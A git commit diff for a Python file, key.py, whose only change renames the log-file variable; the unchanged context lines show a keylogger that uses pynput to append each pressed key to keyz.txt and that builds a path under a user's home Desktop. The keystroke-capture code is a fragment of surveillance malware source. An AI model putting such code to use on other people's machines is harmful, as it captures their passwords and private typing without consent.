5f16ea7e4c395307270dc67c462cdd2a8a893a19
torrad4 <44095229+torrad4@users.noreply.github.com>
2018-10-13 15:01:26 -0300

    Update key.py

--- key.py
+++ key.py
@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener #imports
 import os
 
-logs = 'keyz.txt'
+log = 'keyz.txt'
 Users = os.listdir('/home/')
 user = Users[-1]
 path_log = '/home/'+ user + '/Desktop/test'
@@ -25,7 +25,7 @@ def IsSpecial(key): # substiuindo teclas pro nosso gosto
         return key
     
 def on_press(key): #Quando a tecla eh pressionada
-    arq = open(logs, 'a')
+    arq = open(log, 'a')
     arq.write(str(IsSpecial(key))+ '')
     arq.close()
     #print(IsSpecial(key))
